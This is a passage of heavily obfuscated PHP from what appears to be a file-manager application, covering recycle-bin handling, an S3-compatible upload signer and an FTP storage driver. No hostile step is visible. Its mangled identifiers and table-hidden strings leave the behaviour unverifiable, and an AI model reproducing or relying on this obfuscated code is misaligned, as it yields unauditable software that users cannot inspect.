fileNameExist($Èãö¥àó, $ëåå“Œ) { $Óšø¡Ãè =& $_SERVER[—ÌÒğš÷]; $ªô×ôŞ = $this->field($Óšø¡Ãè[2202])->where(array($Óšø¡Ãè[180] => $Èãö¥àó, $Óšø¡Ãè[32] => $ëåå“Œ, $Óšø¡Ãè[473] => 0))->find(); return is_array($ªô×ôŞ) ? $ªô×ôŞ[$Óšø¡Ãè[181]] : !1; } public function childList($„õ¤„û) { $ĞªÖûÄå =& $_SERVER[—ÌÒğš÷]; $©éã¬Ó“ = $ĞªÖûÄå[2175] . $„õ¤„û; if (isset(self::$cacheChildList[$©éã¬Ó“])) { return self::$cacheChildList[$©éã¬Ó“]; } $Á©Ù É = array($ĞªÖûÄå[180] => intval($„õ¤„û), $ĞªÖûÄå[473] => 0); $†ıäÔÉ” = $this->where($Á©Ù É)->select(); $†ıäÔÉ” = $†ıäÔÉ” ? $†ıäÔÉ” : array(); self::$cacheChildList[$©éã¬Ó“] = $†ıäÔÉ”; foreach ($†ıäÔÉ” as $üÉ‹¿ÓÑ) { $©éã¬Ó“ = $ĞªÖûÄå[501] . $üÉ‹¿ÓÑ[$ĞªÖûÄå[181]]; self::$cacheSourceInfo[$©éã¬Ó“] = $üÉ‹¿ÓÑ; } return $†ıäÔÉ”; } public function fileNameAuto($‘˜¬ñ, $œ¬€„Şò, $ØõõñËÅ = REPEAT_RENAME, $™À‹¢”ğ = false) { $ûÙó ©¶ =& $_SERVER[—ÌÒğš÷]; $íã¸¨á = get_path_ext($œ¬€„Şò); $Ô¹¹ëŠĞ = $íã¸¨á ? basename($œ¬€„Şò, $ûÙó ©¶[10] . $íã¸¨á) . $ûÙó ©¶[2203] . $íã¸¨á : $œ¬€„Şò . $ûÙó ©¶[428]; $ÊÕê¬óí = array($ûÙó ©¶[180] => $‘˜¬ñ, $ûÙó ©¶[473] => 0, $ûÙó ©¶[32] => array($ûÙó ©¶[427], $Ô¹¹ëŠĞ)); $­ã¶‹¾ì = $this->field($ûÙó ©¶[32])->where($ÊÕê¬óí)->select(); $åŒøÙŸƒ = array_to_keyvalue($­ã¶‹¾ì, $ûÙó ©¶[12], $ûÙó ©¶[32]); return $this->fileNameAutoGet($åŒøÙŸƒ, $œ¬€„Şò, $ØõõñËÅ, $™À‹¢”ğ); } public function fileNameAutoGet($ğĞ˜êÜ„, $©óµ‘¤¾, $Œ«æÇÀ, $ÛÛû°Ú) { $ÈçîÎ³ì =& $_SERVER[—ÌÒğš÷]; if ($Œ«æÇÀ == REPEAT_REPLACE || !$ğĞ˜êÜ„ || !in_array_not_case($©óµ‘¤¾, $ğĞ˜êÜ„) || $ÛÛû°Ú && $Œ«æÇÀ != REPEAT_RENAME_FOLDER) { return $©óµ‘¤¾; } if ($Œ«æÇÀ == REPEAT_SKIP) { return !1; } $‚ºìä† = $ÈçîÎ³ì[10] . get_path_ext($©óµ‘¤¾); $‚ºìä† = $‚ºìä† == $ÈçîÎ³ì[10] || $ÛÛû°Ú ? $ÈçîÎ³ì[12] : $‚ºìä†; for ($ØêÏíñƒ = 1; $ØêÏíñƒ <= count($ğĞ˜êÜ„) + 1; $ØêÏíñƒ++) { $ƒû›å‘ = substr($©óµ‘¤¾, 0, strlen($©óµ‘¤¾) - strlen($‚ºìä†)); $ ·üç‡• = $ƒû›å‘ . "\x28{$ØêÏíñƒ}\x29{$‚ºìä†}"; if (!in_array_not_case($ ·üç‡•, $ğĞ˜êÜ„)) { return $ ·üç‡•; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\x65\137\162\145\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\143\162\x65\141\164\145\x54\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\146\x75\156\143\x74\151\x6f\x6e")); public function listData($¯¾»·ö‹ = false) { $İ×¥¦´‹ =& $_SERVER[—ÌÒğš÷]; $¯¾»·ö‹ = $¯¾»·ö‹ ? $¯¾»·ö‹ : USER_ID; $ûçô’©î = $this->where(array($İ×¥¦´‹[1679] => $¯¾»·ö‹))->select(); return array_to_keyvalue($ûçô’©î, $İ×¥¦´‹[12], $İ×¥¦´‹[181]); } public function moveToRecycle($ì”£¸ÛÂ) { $×ª¥ë€é =& $_SERVER[—ÌÒğš÷]; $Ğòî€™‚ = Model($×ª¥ë€é[1376]); $˜‰ë›üê = $Ğòî€™‚->sourceInfo($ì”£¸ÛÂ); if (!$˜‰ë›üê || $˜‰ë›üê[$×ª¥ë€é[473]] == $×ª¥ë€é[88]) { return; } $Å®âÚ = array($×ª¥ë€é[459] => $ì”£¸ÛÂ, $×ª¥ë€é[1679] => USER_ID, $×ª¥ë€é[616] => $˜‰ë›üê[$×ª¥ë€é[178]], $×ª¥ë€é[617] => $˜‰ë›üê[$×ª¥ë€é[538]], $×ª¥ë€é[620] => $˜‰ë›üê[$×ª¥ë€é[553]]); $this->add($Å®âÚ); $this->recycleMove($ì”£¸ÛÂ, 1); if ($˜‰ë›üê[$×ª¥ë€é[453]] == $×ª¥ë€é[88]) { $ñÆ·˜¤Õ = array($×ª¥ë€é[620] => array($×ª¥ë€é[580], $˜‰ë›üê[$×ª¥ë€é[553]] . $ì”£¸ÛÂ . $×ª¥ë€é[581])); $Ğòî€™‚->where($ñÆ·˜¤Õ)->setField($×ª¥ë€é[473], 1); } } public function clear() { $this->remove(!1); } public function remove($‡ƒ½Ô³» = false, $öÜ›šÁÅ = false) { $Ø©Š»å³ =& $_SERVER[—ÌÒğš÷]; $öÜ›šÁÅ = $öÜ›šÁÅ ? $öÜ›šÁÅ : USER_ID; $¡…¼ÅîÇ = Model($Ø©Š»å³[1376]); $‡æ–§¾£ = $this->listData($öÜ›šÁÅ); $‡ƒ½Ô³» = $‡ƒ½Ô³» === !1 ? !1 : $‡ƒ½Ô³»; $£¼¿´ğí = array(); foreach ($‡æ–§¾£ as $ÑåØ”şá) { if ($‡ƒ½Ô³» != !1 && !in_array($ÑåØ”şá, $‡ƒ½Ô³»)) { continue; } $ŠçêÁò = $¡…¼ÅîÇ->sourceInfo($ÑåØ”şá); $¡…¼ÅîÇ->remove($ÑåØ”şá, !1); $ËîÅàÓ­ = $ŠçêÁò[$Ø©Š»å³[178]] . $Ø©Š»å³[11] . $ŠçêÁò[$Ø©Š»å³[538]]; $£¼¿´ğí[$ËîÅàÓ­] = array($Ø©Š»å³[616] => $ŠçêÁò[$Ø©Š»å³[178]], $Ø©Š»å³[538] => $ŠçêÁò[$Ø©Š»å³[538]]); $this->where(array($Ø©Š»å³[181] => $ÑåØ”şá))->delete(); } foreach ($£¼¿´ğí as $€ü‰½Êª) { $¡…¼ÅîÇ->targetSpaceUpdate($€ü‰½Êª[$Ø©Š»å³[178]], $€ü‰½Êª[$Ø©Š»å³[538]]); } } public function restore($âÙá×ñã = false) { $¥Œ”°ä = $this->listData(); $this->_restoreSource($¥Œ”°ä, $âÙá×ñã); } public function removeUserAll($üã…§ª“) { $this->remove(!1, $üã…§ª“); } public function restoreItem($Ğâ…èå§) { $this->_restoreSource(array($Ğâ…èå§), array($Ğâ…èå§)); } private function _restoreSource($Á¹Ş¡à×, $‰´…êÃØ) { $‹äáÏ¶ =& $_SERVER[—ÌÒğš÷]; $öåÒĞú = Model($‹äáÏ¶[1376]); $‰´…êÃØ = $‰´…êÃØ == !1 ? !1 : $‰´…êÃØ; if (!$Á¹Ş¡à×) { return !0; } $Ä‹Àùª„ = array(); foreach ($Á¹Ş¡à× as $‡ÊÒÑ¶») { if ($‰´…êÃØ != !1 && !in_array($‡ÊÒÑ¶», $‰´…êÃØ)) { continue; } $ñ›Òëå = $öåÒĞú->sourceInfo($‡ÊÒÑ¶»); $ÆÒâôê³ = $öåÒĞú->sourceInfo($ñ›Òëå[$‹äáÏ¶[180]]); if ($ÆÒâôê³[$‹äáÏ¶[473]] == $‹äáÏ¶[88]) { continue; } $öåÒĞú->lockMoveStart($‡ÊÒÑ¶»); $this->recycleMove($‡ÊÒÑ¶», 0); if ($ñ›Òëå[$‹äáÏ¶[453]] == $‹äáÏ¶[88]) { $ï”øÈ–» = array($‹äáÏ¶[620] => array($‹äáÏ¶[580], $ñ›Òëå[$‹äáÏ¶[553]] . $‡ÊÒÑ¶» . $‹äáÏ¶[581])); $öåÒĞú->where($ï”øÈ–»)->setField($‹äáÏ¶[473], 0); $this->restoreFolderChildren($‡ÊÒÑ¶», $Á¹Ş¡à×); } $this->where(array($‹äáÏ¶[181] => $‡ÊÒÑ¶»))->delete(); $öåÒĞú->folderSizeReset($ñ›Òëå[$‹äáÏ¶[180]]); $Ä‹Àùª„[] = $ñ›Òëå[$‹äáÏ¶[180]]; if ($ñ›Òëå[$‹äáÏ¶[453]] == $‹äáÏ¶[88]) { $Ä‹Àùª„[] = $‡ÊÒÑ¶»; } $öåÒĞú->lockMoveEnd($‡ÊÒÑ¶»); } $öåÒĞú->updateModifyTime($Ä‹Àùª„); } private function restoreFolderChildren($¬ï‰ÌôÀ, $Êöû²ıİ) { $¨¶ñÄ¡Ó =& $_SERVER[—ÌÒğš÷]; $ş‰÷›¦Ã = Model($¨¶ñÄ¡Ó[1376]); $¶ÁğÀÜ¿ = array($¨¶ñÄ¡Ó[181] => array($¨¶ñÄ¡Ó[7], array())); foreach ($Êöû²ıİ as $Š…ó‹ŒÖ) { if ($Š…ó‹ŒÖ == $¬ï‰ÌôÀ) { continue; } if (!$ş‰÷›¦Ã->isParentOf($¬ï‰ÌôÀ, $Š…ó‹ŒÖ)) { continue; } $Óøå’Š¢ = $ş‰÷›¦Ã->sourceInfo($Š…ó‹ŒÖ); if ($Óøå’Š¢[$¨¶ñÄ¡Ó[453]] == $¨¶ñÄ¡Ó[88]) { $¶ÁğÀÜ¿[] = array($¨¶ñÄ¡Ó[620] => array($¨¶ñÄ¡Ó[580], $Óøå’Š¢[$¨¶ñÄ¡Ó[553]] . $Š…ó‹ŒÖ . $¨¶ñÄ¡Ó[581])); } else { $¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]][1][] = $Š…ó‹ŒÖ; } } if (!$¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]][1]) { unset($¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]]); } if (!$¶ÁğÀÜ¿) { return; } if (is_array($¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]]) && is_array($¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]][1])) { $¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]][1] = array_unique($¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[181]][1]); } $¶ÁğÀÜ¿[$¨¶ñÄ¡Ó[1044]] = $¨¶ñÄ¡Ó[1985]; $ş‰÷›¦Ã->where($¶ÁğÀÜ¿)->setField($¨¶ñÄ¡Ó[473], 1); } private function recycleMove($’“Èóâı, $ºÅĞûŞ« = 1) { $õé²šÜà =& $_SERVER[—ÌÒğš÷]; $›Ï°¼€¦ = Model($õé²šÜà[1376]); $é­‚¨»Ã = Model($õé²šÜà[2204]); $ÁØ‹Õç“ = array($õé²šÜà[181] => $’“Èóâı); if ($ºÅĞûŞ«) { $›Ï°¼€¦->where($ÁØ‹Õç“)->setField($õé²šÜà[473], 1); $é­‚¨»Ã->eventRecycle($’“Èóâı, $õé²šÜà[2205]); } else { $ˆáŒ±´à = $›Ï°¼€¦->where($ÁØ‹Õç“)->find(); $¡ë©ÔÖ« = $ˆáŒ±´à[$õé²šÜà[453]] == $õé²šÜà[88]; $‚¡ƒÆ“’ = $›Ï°¼€¦->fileNameAuto($ˆáŒ±´à[$õé²šÜà[180]], $ˆáŒ±´à[$õé²šÜà[32]], REPEAT_RENAME_FOLDER, $¡ë©ÔÖ«); if ($‚¡ƒÆ“’ != $ˆáŒ±´à[$õé²šÜà[32]]) { $›Ï°¼€¦->rename($’“Èóâı, $‚¡ƒÆ“’); } $›Ï°¼€¦->where($ÁØ‹Õç“)->setField($õé²šÜà[473], 0); $é­‚¨»Ã->eventRecycle($’“Èóâı, $õé²šÜà[2206]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x73\157\165\162\x63\145\x53\x65\x63\162\145\x74\x4c\151\163\x74"; public $field = array("\163\x6f\165\162\143\145\x49\x44", "\164\x79\160\145\x49\x44", "\143\x72\145\141\164\x65\125\x73\145\x72"); } goto c¤œãöÒ¼; bøÓ¿Ñ—µØ: class PathDriverEDS extends PathDriverMinIO { public function __construct($Çñ€“À™) { parent::__construct($Çñ€“À™); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¤Â¡ëÍ­) { parent::__construct($¤Â¡ëÍ­); $this->signatureVersion($_SERVER[—ÌÒğš÷][231]); } public function uploadFormData($†Ü¡ĞÓŒ, $÷ıÍîó¸ = 3600) { $‚´™Şù =& $_SERVER[—ÌÒğš÷]; $À¾ã§º = $‚´™Şù[213]; $—Ú¿±²ƒ = $‚´™Şù[253]; $ñÓ°Í¹À = $‚´™Şù[62]; $òê±‡ºá = gmdate($‚´™Şù[254]); $Ü¥ñÀÏ = gmdate($‚´™Şù[255]); $˜Ç®Û© = $‚´™Şù[256]; $ˆõ‰÷°ó = $÷ıÍîó¸ . $‚´™Şù[12]; $ƒ˜€¤Í = $‚´™Şù[257]; $ğ¾ éª = array($this->accessKey, $Ü¥ñÀÏ, $this->region, $ñÓ°Í¹À, $˜Ç®Û©); $í•‚§Â© = implode($‚´™Şù[8], $ğ¾ éª); $«ıìÌôÍ = array($‚´™Şù[258] => gmdate($‚´™Şù[1368], strtotime($‚´™Şù[260])), $‚´™Şù[261] => array(array($‚´™Şù[262] => $this->bucket), array($‚´™Şù[263] => $À¾ã§º), array($‚´™Şù[264], $‚´™Şù[265], $‚´™Şù[12]), array($‚´™Şù[264], $‚´™Şù[266], $‚´™Şù[12]), array($‚´™Şù[264], $‚´™Şù[267], $‚´™Şù[12]), array($‚´™Şù[268] => $ƒ˜€¤Í), array($‚´™Şù[269] => $í•‚§Â©), array($‚´™Şù[270] => $—Ú¿±²ƒ), array($‚´™Şù[271] => $òê±‡ºá), array($‚´™Şù[272] => $ˆõ‰÷°ó))); $Ä¶ß´¢û = base64_encode(json_encode($«ıìÌôÍ)); $±Üˆˆ¢¦ = hash_hmac($‚´™Şù[273], $Ü¥ñÀÏ, $‚´™Şù[274] . $this->secret, !0); $®˜˜· = hash_hmac($‚´™Şù[273], $this->region, $±Üˆˆ¢¦, !0); $‡–¼» = hash_hmac($‚´™Şù[273], $ñÓ°Í¹À, $®˜˜·, !0); $ëÈ¤´ = hash_hmac($‚´™Şù[273], $˜Ç®Û©, $‡–¼», !0); $ØñÕ•Ùú = hash_hmac($‚´™Şù[273], $Ä¶ß´¢û, $ëÈ¤´); $ ŠæË€‡ = array($‚´™Şù[230] => $‚´™Şù[12], $‚´™Şù[275] => $‚´™Şù[12], $‚´™Şù[263] => $À¾ã§º, $‚´™Şù[268] => $ƒ˜€¤Í, $‚´™Şù[276] => $Ä¶ß´¢û, $‚´™Şù[277] => $í•‚§Â©, $‚´™Şù[278] => $—Ú¿±²ƒ, $‚´™Şù[279] => $òê±‡ºá, $‚´™Şù[280] => $ˆõ‰÷°ó, $‚´™Şù[281] => $ØñÕ•Ùú, $‚´™Şù[196] => $this->getHost()); return $ ŠæË€‡; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($á¬¤è…ì) { parent::__construct(); if (count($á¬¤è…ì) > 0) { $this->_init($á¬¤è…ì); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¦Ş’ê¥) { $‹³Ëô´ =& $_SERVER[—ÌÒğš÷]; global $config; $this->appCharset = $config[$‹³Ëô´[1394]]; $this->systemCharset = $config[$‹³Ëô´[1395]]; if (isset($¦Ş’ê¥[$‹³Ëô´[1396]]) && $¦Ş’ê¥[$‹³Ëô´[1396]]) { $this->systemCharset = $¦Ş’ê¥[$‹³Ëô´[1396]]; } } public function iconvApp($ÉºÂóøå) { return $this->iconvTo($ÉºÂóøå, $this->systemCharset, $this->appCharset); } public function iconvSystem($ªİÀ¬¥ı) { return $this->iconvTo($ªİÀ¬¥ı, $this->appCharset, $this->systemCharset); } public function getPathOuter($¬œ¼ß‡–) { $¿Œ’…Ìù =& $_SERVER[—ÌÒğš÷]; $›ÏçÛÖš = $this->iconvApp($this->pathBase); $¬œ¼ß‡– = $this->iconvApp($¬œ¼ß‡–); if (substr($›ÏçÛÖš, 0, 2) == $¿Œ’…Ìù[1397]) { $›ÏçÛÖš = BASIC_PATH . substr($›ÏçÛÖš, 2); } if (substr($¬œ¼ß‡–, 0, 2) == $¿Œ’…Ìù[1397]) { $¬œ¼ß‡– = BASIC_PATH . substr($¬œ¼ß‡–, 2); } $›ÏçÛÖš = KodIO::clear($›ÏçÛÖš); $¬œ¼ß‡– = KodIO::clear($¬œ¼ß‡–); $¬œ¼ß‡– = substr($¬œ¼ß‡–, strlen($›ÏçÛÖš)); if (empty($this->pathDriver)) { return $¬œ¼ß‡–; } return $this->pathDriver . $¿Œ’…Ìù[8] . ltrim($¬œ¼ß‡–, $¿Œ’…Ìù[8]); } private function _init($ˆÕÉˆŞ = array()) { $ÖÎàŒâ— =& $_SERVER[—ÌÒğš÷]; if (!function_exists($ÖÎàŒâ—[1398])) { throw new Exception(LNG($ÖÎàŒâ—[1399])); } $this->config = $ˆÕÉˆŞ; $this->charsetReset($ˆÕÉˆŞ); foreach ($ˆÕÉˆŞ as $Ğ—ÑŸ„ => $´ı˜±ÓÂ) { if (isset($this->{$Ğ—ÑŸ„})) { $this->{$Ğ—ÑŸ„} = $´ı˜±ÓÂ; } } return $this->_login($ˆÕÉˆŞ); } private function _login($·«˜ş¥—) { $­¸é³ü— =& $_SERVER[—ÌÒğš÷]; static $ß†­×â = array(); $Ï Óô© = md5(json_encode($·«˜ş¥—)); if (isset($ß†­×â[$Ï Óô©])) { foreach ($ß†­×â[$Ï Óô©] as $áò“î…ß => $×öÜ›÷à) { $this->{$áò“î…ß} = $×öÜ›÷à; } return !0; } $áöğåâÄ = parse_url(trim($this->server, $­¸é³ü—[8])); $this->host = $áöğåâÄ[$­¸é³ü—[196]]; $†¡°¾•× = isset($áöğåâÄ[$­¸é³ü—[195]]) && $áöğåâÄ[$­¸é³ü—[195]] == $­¸é³ü—[1400] ? !0 : !1; $this->scheme = $†¡°¾•× ? $­¸é³ü—[1401] : $­¸é³ü—[1402]; $this->port = isset($áöğåâÄ[$­¸é³ü—[197]]) ? $áöğåâÄ[$­¸é³ü—[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ñ¼‹šì = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¥ùñ™¡³ = $this->pasv == $­¸é³ü—[88] ? !0 : !1; @ftp_pasv($this->connect, $¥ùñ™¡³); $ß†­×â[$Ï Óô©] = array($­¸é³ü—[1403] => $this->connect, $­¸é³ü—[196] => $this->host, $­¸é³ü—[195] => $this->scheme, $­¸é³ü—[197] => $this->port); return $Ñ¼‹šì; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ì¦¸× ®, $„‚«”Şî = '', $ğŒöëÉ = REPEAT_RENAME) { if ($this->setContent($ì¦¸× ®, $„‚«”Şî)) { return $this->getPathOuter($ì¦¸× ®); } return !1; } public function mkdir($ÅôŒ¶Öä, $ğ­³ƒÙÜ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÅôŒ¶Öä = $this->iconvSystem($ÅôŒ¶Öä); if ($this->_isFolder($ÅôŒ¶Öä) || @ftp_mkdir($this->connect, $ÅôŒ¶Öä)) { return $this->getPathOuter($ÅôŒ¶Öä); } if (!$this->mkdir($this->pathFather($ÅôŒ¶Öä))) { return !1; } if ($ÅôŒ¶Öä = @ftp_mkdir($this->connect, $ÅôŒ¶Öä)) { return $this->getPathOuter($ÅôŒ¶Öä); } return !1; } public function copyFile($ñ°şÃĞË, $ĞçŒÈ) { if (!$this->_isconn()) { return !1; } $ëÆÜ¡ = $this->pathThis($this->iconvSystem($ñ°şÃĞË)); $Ù‘üÜı© = $this->tempFile($ëÆÜ¡); $™Æœå©’ = $this->iconvApp($Ù‘üÜı©); $this->download($ñ°şÃĞË, $™Æœå©’); $”úµÈ·® = $this->upload($ĞçŒÈ, $™Æœå©’); $this->tempFileRemve($Ù‘üÜı©); return $”úµÈ·®; } public function moveFile($ÊÀïèÒÓ, $«½«½»ı) { if (!$this->_isconn()) { return !1; } $ÊÀïèÒÓ = $this->iconvSystem($ÊÀïèÒÓ); $«½«½»ı = $this->iconvSystem($«½«½»ı); $ÔšÏ”ÕÕ = @ftp_rename($this->connect, $ÊÀïèÒÓ, $«½«½»ı); return $ÔšÏ”ÕÕ ? $this->getPathOuter($«½«½»ı) : !1; } public function delFile($²ò‹ÍÍ¨) { if (!$this->_isconn()) { return !1; } $²ò‹ÍÍ¨ = $this->iconvSystem($²ò‹ÍÍ¨); return @ftp_delete($this->connect, $²ò‹ÍÍ¨); } public function delFolder($ô‘³Ìê‘) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $°–Şâ•¬ = $îÍìÙÏö = array(); $this->fileList($ô‘³Ìê‘, $°–Şâ•¬, $îÍìÙÏö, !0); $this->listItemCache = !0; foreach ($îÍìÙÏö as $ĞÔêº†) { $ğÔëáƒ = $this->iconvSystem($ĞÔêº†[$_SERVER[—ÌÒğš÷][32]]); $ì² Ï¯¶ = @ftp_delete($this->connect, $ğÔëáƒ); if (!$ì² Ï¯¶) { return !1; } } foreach ($°–Şâ•¬ as $ğÔëáƒ) { $ğÔëáƒ = $this->iconvSystem($ğÔëáƒ); $ì² Ï¯¶ = @ftp_rmdir($this->connect, $ğÔëáƒ); if (!$ì² Ï¯¶) { return !1; } } $ô‘³Ìê‘ = $this->iconvSystem($ô‘³Ìê‘); return @ftp_rmdir($this->connect, $ô‘³Ìê‘); } public function rename($¬ƒşÛÅÙ, $ˆëÄ—´Å) { $æ¬¡ÎÒÈ =& $_SERVER[—ÌÒğš÷]; if (!$this->_isconn()) { return !1; } $ß€¨éÈœ = $this->fileNameAuto($this->pathFather($¬ƒşÛÅÙ), $ˆëÄ—´Å); $ß€¨éÈœ = $this->iconvSystem($ß€¨éÈœ); $¬ƒşÛÅÙ = $this->iconvSystem($¬ƒşÛÅÙ); $°®¤•µ³ = $this->pathFather($¬ƒşÛÅÙ); $Üª—ë‚û = rtrim($°®¤•µ³, $æ¬¡ÎÒÈ[8]) . $æ¬¡ÎÒÈ[8] . $ß€¨éÈœ; $²äâ“µÍ = @ftp_rename($this->connect, $¬ƒşÛÅÙ, $Üª—ë‚û); $Üª—ë‚û = $this->iconvApp($Üª—ë‚û); return $²äâ“µÍ ? $this->getPathOuter($Üª—ë‚û) : !1; } private function folderInfo($çî¥µöâ, $„äï”÷š = false) { $èÇ·¡ƒì =& $_SERVER[—ÌÒğš÷]; $¾ì´•á = array($èÇ·¡ƒì[32] => $this->pathThis($çî¥µöâ), $èÇ·¡ƒì[84] => $this->getPathOuter($èÇ·¡ƒì[8] . $çî¥µöâ), $èÇ·¡ƒì[33] => $èÇ·¡ƒì[75]); if ($„äï”÷š) { return $¾ì´•á; } $¾ì´•á[$èÇ·¡ƒì[215]] = $¾ì´•á[$èÇ·¡ƒì[85]] = 0; $¾ì´•á[$èÇ·¡ƒì[216]] = $¾ì´•á[$èÇ·¡ƒì[217]] = !0; return $¾ì´•á; } private function fileInfo($çÊæÌÒÀ, $ñ¼ĞØì = false, $¿şÎ”æÇ = array()) { $åÙÆæ‚ =& $_SERVER[—ÌÒğš÷]; $ßşè¤¼¤ = array($åÙÆæ‚[32] => $this->pathThis($çÊæÌÒÀ), $åÙÆæ‚[84] => $this->getPathOuter($åÙÆæ‚[8] . $çÊæÌÒÀ), $åÙÆæ‚[33] => $åÙÆæ‚[214], $åÙÆæ‚[76] => isset($¿şÎ”æÇ[$åÙÆæ‚[76]]) ? $¿şÎ”æÇ[$åÙÆæ‚[76]] : 0, $åÙÆæ‚[175] => $this->ext($çÊæÌÒÀ)); if ($ñ¼ĞØì) { return $ßşè¤¼¤; } $ßşè¤¼¤[$åÙÆæ‚[215]] = $ßşè¤¼¤[$åÙÆæ‚[85]] = 0; $ßşè¤¼¤[$åÙÆæ‚[216]] = $ßşè¤¼¤[$åÙÆæ‚[217]] = !0; $†Õ…²¡¶ = $this->iconvSystem($çÊæÌÒÀ); $ßşè¤¼¤[$åÙÆæ‚[85]] = @ftp_mdtm($this->connect, $†Õ…²¡¶); if (empty($¿şÎ”æÇ)) { $¿şÎ”æÇ = $this->objectMeta($çÊæÌÒÀ); if (!$¿şÎ”æÇ) { return $ßşè¤¼¤; } } $ßşè¤¼¤[$åÙÆæ‚[76]] = $¿şÎ”æÇ[$åÙÆæ‚[76]]; return $ßşè¤¼¤; } public function size($Éô…óÃ) { $¥ìşîˆ“ = $this->objectMeta($Éô…óÃ); return $¥ìşîˆ“ ? $¥ìşîˆ“[$_SERVER[—ÌÒğš÷][76]] : 0; } public function info($€Ã¬ŒÛ“) { if ($this->isFile($€Ã¬ŒÛ“)) { return $this->fileInfo($€Ã¬ŒÛ“, 0); } else { if ($this->isFolder($€Ã¬ŒÛ“)) { return $this->folderInfo($€Ã¬ŒÛ“); } } return !1; } private function fileList($úĞåˆıÅ, &$İ¹Å¼á³, &$×º˜ë€›, $ªâ”Àï¹ = false) { $³—«“´ =& $_SERVER[—ÌÒğš÷]; $úĞåˆıÅ = $this->iconvSystem($úĞåˆıÅ); if (!$this->isFolder($úĞåˆıÅ)) { return !1; } @ftp_chdir($this->connect, $³—«“´[8]); $úĞåˆıÅ = rtrim($úĞåˆıÅ, $³—«“´[8]) . $³—«“´[8]; check_abort(); $°€£ê…ú = @ftp_rawlist($this->connect, $úĞåˆıÅ); if (!$°€£ê…ú) { $°€£ê…ú = array(); } $½ä‚‰öÑ = array($³—«“´[10] => 1, $³—«“´[1322] => 1); foreach ($°€£ê…ú as $…Ÿ­Á ) { $Æ÷¥×—… = $this->_listItem($…Ÿ­Á ); if ($Æ÷¥×—…[0] == $³—«“´[794]) { continue; } $¡ÉŒ¶Æ = $Æ÷¥×—…[8]; if (empty($¡ÉŒ¶Æ) && $¡ÉŒ¶Æ !== $³—«“´[212] || isset($½ä‚‰öÑ[$¡ÉŒ¶Æ])) { continue; } $¡ÉŒ¶Æ = $this->iconvApp($úĞåˆıÅ . ltrim($¡ÉŒ¶Æ, $³—«“´[8])); $¢ÑÜ¹ç = array($³—«“´[32] => $¡ÉŒ¶Æ, $³—«“´[33] => $³—«“´[214], $³—«“´[76] => $Æ÷¥×—…[4]); if (substr($…Ÿ­Á , 0, 1) == $³—«“´[1404]) { $¢ÑÜ¹ç[$³—«“´[33]] = $³—«“´[75]; $¢ÑÜ¹ç[$³—«“´[76]] = 0; } $‘òùÆ½İ = $¢ÑÜ¹ç[$³—«“´[33]] == $³—«“´[75] ? !0 : !1; $this->cacheMethodInfoSet($¡ÉŒ¶Æ, $‘òùÆ½İ, $¢ÑÜ¹ç); if ($‘òùÆ½İ) { $İ¹Å¼á³[] = $¡ÉŒ¶Æ; if ($ªâ”Àï¹) { $this->fileList($¡ÉŒ¶Æ, $İ¹Å¼á³, $×º˜ë€›, $ªâ”Àï¹); } continue; } $×º˜ë€›[] = $¢ÑÜ¹ç; } $this->cacheMethodInfoSet($úĞåˆıÅ, !0); } private function _listItem($ê­Õ®óÇ) { if (empty($ê­Õ®óÇ)) { return array(); } $èãÓ«­ê = preg_split($_SERVER[—ÌÒğš÷][1405], $ê­Õ®óÇ); if (count($èãÓ«­ê) <= 9) { return $èãÓ«­ê; } $èãÓ«­ê[8] = trim(substr($ê­Õ®óÇ, strpos($ê­Õ®óÇ, $èãÓ«­ê[7]) + strlen($èãÓ«­ê[7]))); return array_splice($èãÓ«­ê, 0, 9); } public function listPath($Ë¿Ô¨, $ñ´Òä¥ = false) { $¿½ÚËêÉ =& $_SERVER[—ÌÒğš÷]; if (!$this->_isconn()) { return !1; } $„ùùĞÊÌ = $ï¦Ç”è­ = array(); $this->fileList($Ë¿Ô¨, $„ùùĞÊÌ, $ï¦Ç”è­); foreach ($„ùùĞÊÌ as $ğÔÌáıä => $ Ñ½äè) { $„ùùĞÊÌ[$ğÔÌáıä] = $this->folderInfo($ Ñ½äè, $ñ´Òä¥); } foreach ($ï¦Ç”è­ as $ğÔÌáıä => $ Ñ½äè) { $ï¦Ç”è­[$ğÔÌáıä] = $this->fileInfo($ Ñ½äè[$¿½ÚËêÉ[32]], $ñ´Òä¥, $ Ñ½äè); } return array($¿½ÚËêÉ[82] => $„ùùĞÊÌ, $¿½ÚËêÉ[83] => $ï¦Ç”è­); } public function has($ÇÜáò¬é, $ƒ„ÆÅ = false, $¸€°•Üµ = true) { $¢ßÙ—“„ =& $_SERVER[—ÌÒğš÷]; $Ğ©Ÿ›Ôê = $—¬úË©Û = array(); $¼Ñ© óÀ = $ƒ„ÆÅ ? !0 : !1; $this->fileList($ÇÜáò¬é, $Ğ©Ÿ›Ôê, $—¬úË©Û, $¼Ñ© óÀ); if ($ƒ„ÆÅ) { return array($¢ßÙ—“„[223] => count($—¬úË©Û), $¢ßÙ—“„[224] => count($Ğ©Ÿ›Ôê)); } if ($¸€°•Üµ) { if (count($—¬úË©Û)) { return !0; } } else { if (count($Ğ©Ÿ›Ôê)) { return !0; } } return !1; } public function 